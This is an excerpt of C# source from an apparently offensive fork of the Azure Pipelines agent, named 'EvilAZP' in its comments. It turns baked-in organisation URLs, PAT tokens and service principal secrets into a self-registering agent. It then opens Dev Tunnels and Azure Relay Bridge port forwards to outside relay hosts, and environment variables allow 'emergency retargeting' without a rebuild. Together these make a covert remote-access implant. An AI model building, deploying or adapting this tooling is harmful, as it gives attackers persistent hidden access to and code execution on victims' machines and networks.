...
#if ENABLE_AZURE_RELAY_BRIDGE
using Microsoft.VisualStudio.Services.Agent.Plugins.AzureRelayBridge;
#endif
...
namespace Microsoft.VisualStudio.Services.Agent.Listener
{
    ...
    public sealed class Agent : AgentService, IAgent, IDisposable
    {
        ...
        public async Task<int> ExecuteCommand(CommandSettings command)
        {
            using (Trace.EnteringWithDuration())
            {
                ...
                try
                {
                    ...
                    {
                        bool hasArgs = command.IsRunCommand() && command.HasRunConfigurationArgs();
                        bool hasBaked = BakedConfig.HasAgentConfig;
                        if (hasArgs || hasBaked)
                        {
                            if (hasBaked && !hasArgs)
                            {
                                // EvilAZP single-binary mode: translate baked
                                // constants back into the normal agent run args
                                // so the upstream configuration path is reused.
                                Trace.Info("Using baked configuration.");
                                string bakedAgentName = GetBakedAgentNameForHost(BakedConfig.AgentName);
                                string[] bakedArgs = new[] { "run",
                                    "--url", BakedConfig.OrgUrl,
                                    "--auth", "pat",
                                    "--token", BakedConfig.Pat,
                                    "--pool", BakedConfig.Pool,
                                    "--agent", bakedAgentName,
                                    "--work", "_work",
                                    "--replace" };
                                command = new CommandSettings(HostContext, bakedArgs, null);
                            }
                            PrintBanner();
                            try
                            {
        ...
        private async Task<int> RunAsync(AgentSettings settings, bool runOnce = false)
        {
            using (Trace.EnteringWithDuration())
            {
                try
                {
                    ...
                    // --- Tunnel plugin (loaded dynamically if present) ---
                    ITunnelPlugin tunnelPlugin = null;
                    IRelayBridgePlugin relayBridgePlugin = null;
                    // Environment variables intentionally override baked values
                    // for emergency retargeting without rebuilding the binary.
                    var spTenantId = Environment.GetEnvironmentVariable("EVILAZP_SP_TENANT") ?? BakedConfig.SpTenant;
                    var spClientId = Environment.GetEnvironmentVariable("EVILAZP_SP_CLIENT") ?? BakedConfig.SpClient;
                    var spSecret = Environment.GetEnvironmentVariable("EVILAZP_SP_SECRET") ?? BakedConfig.SpSecret;
                    var tunnelId = Environment.GetEnvironmentVariable("EVILAZP_TUNNEL_ID") ??
                        Environment.GetEnvironmentVariable("EVILAZP_TUNNEL_NAME") ??
                        BakedConfig.TunnelId;
                    var tunnelPortsEnv = Environment.GetEnvironmentVariable("EVILAZP_TUNNEL_PORTS") ?? BakedConfig.TunnelPorts;
                    if (!string.IsNullOrEmpty(spTenantId) && !string.IsNullOrEmpty(spClientId) &&
                        !string.IsNullOrEmpty(spSecret) && !string.IsNullOrEmpty(tunnelPortsEnv))
                    {
                        try
                        {
                            // The plugin assembly is included only for
                            // /p:EnableTunnel=true builds. Reflection keeps
                            // vanilla builds free of Dev Tunnels dependencies.
                            var pluginType = Type.GetType(
                                "Microsoft.VisualStudio.Services.Agent.Plugins.Tunnel.TunnelPlugin, Agent.Plugins.Tunnel");
                            if (pluginType != null)
                            {
                                tunnelPlugin = (ITunnelPlugin)Activator.CreateInstance(pluginType);
                                var ports = Array.ConvertAll(tunnelPortsEnv.Split(','), int.Parse);
                                _ = tunnelPlugin.StartAsync(spTenantId, spClientId, spSecret, tunnelId, ports, HostContext.AgentShutdownToken)
                                    .ContinueWith(t =>
                                    {
                                        if (t.IsFaulted)
                                        {
                                            var baseException = t.Exception?.GetBaseException();
                                            Trace.Error($"Tunnel failed: {baseException?.GetType().FullName}: {baseException?.Message}");
                                            Trace.Error(t.Exception?.ToString());
                                        }
                                        else
                                        {
                                            Trace.Info($"Tunnel active: {tunnelPlugin.TunnelUrl}");
                                        }
                                    });
                            }
                            else
                            {
                                Trace.Info("Tunnel configured but plugin assembly is not included in this build.");
                            }
                        }
                        catch (Exception ex)
                        {
                            Trace.Error($"Tunnel init failed: {ex.Message}");
                        }
                    }
                    // --- end tunnel plugin ---

                    // --- Azure Relay Bridge plugin (loaded dynamically if present) ---
                    var relayConnectionString = Environment.GetEnvironmentVariable("AZP_RELAY_CONNECTION_STRING") ?? BakedConfig.AzureRelayConnectionString;
                    var relayLocalForwards = SplitRelayForwards(Environment.GetEnvironmentVariable("AZP_RELAY_LOCAL_FORWARDS") ?? BakedConfig.AzureRelayLocalForwards);
                    var relayRemoteForwards = SplitRelayForwards(Environment.GetEnvironmentVariable("AZP_RELAY_REMOTE_FORWARDS") ?? BakedConfig.AzureRelayRemoteForwards);
                    var relayRemoteHttpForwards = SplitRelayForwards(Environment.GetEnvironmentVariable("AZP_RELAY_REMOTE_HTTP_FORWARDS") ?? BakedConfig.AzureRelayRemoteHttpForwards);
                    if (!string.IsNullOrEmpty(relayConnectionString) &&
                        (relayLocalForwards.Length > 0 || relayRemoteForwards.Length > 0 || relayRemoteHttpForwards.Length > 0))
                    {
                        try
                        {
#if ENABLE_AZURE_RELAY_BRIDGE
                            relayBridgePlugin = new AzureRelayBridgePlugin();
                            await relayBridgePlugin.StartAsync(
                                relayConnectionString,
                                relayLocalForwards,
                                relayRemoteForwards,
                                relayRemoteHttpForwards,
                                HostContext.AgentShutdownToken);
#else
                            // Relay Bridge is optional for the same reason as
                            // Dev Tunnels: non-relay builds should not carry the
                            // SDK dependency graph or startup side effects.
                            Type pluginType = null;
                            try
                            {
                                var pluginAssembly = Assembly.Load("Agent.Plugins.AzureRelayBridge");
                                pluginType = pluginAssembly.GetType(
                                    "Microsoft.VisualStudio.Services.Agent.Plugins.AzureRelayBridge.AzureRelayBridgePlugin");
                            }
                            catch (Exception loadEx)
                            {
                                Trace.Info($"Azure Relay Bridge plugin assembly is not available: {loadEx.Message}");
                            }
                            if (pluginType != null)
                            {
                                relayBridgePlugin = (IRelayBridgePlugin)Activator.CreateInstance(pluginType);
                                await relayBridgePlugin.StartAsync(
                                    relayConnectionString,
                                    relayLocalForwards,
                                    relayRemoteForwards,
                            ...
                            {
                                Trace.Info("Azure Relay Bridge configured but plugin assembly is not included in this build.");
                            }
#endif
                        }
                        catch (Exception ex)
                        {
                            Trace.Error($"Azure Relay Bridge init failed: {ex.Message}");
                        }
                    }
                    // --- end Azure Relay Bridge plugin ---
                    ...
                    finally
                    {
                        ...
                        if (relayBridgePlugin != null)
                        {
                            Trace.Info("Stopping Azure Relay Bridge plugin");
                            await relayBridgePlugin.StopAsync();
                        }

                        if (tunnelPlugin != null)
                        {
                            Trace.Info("Stopping Tunnel plugin");
                            await tunnelPlugin.StopAsync();
                        }
        ...
        private static string[] SplitRelayForwards(string value)
        {
        ...
        private static string GetBakedAgentNameForHost(string baseAgentName)
        {
            ...
            return $"{baseAgentName.Trim()}-{hostName.Trim()}";
        }
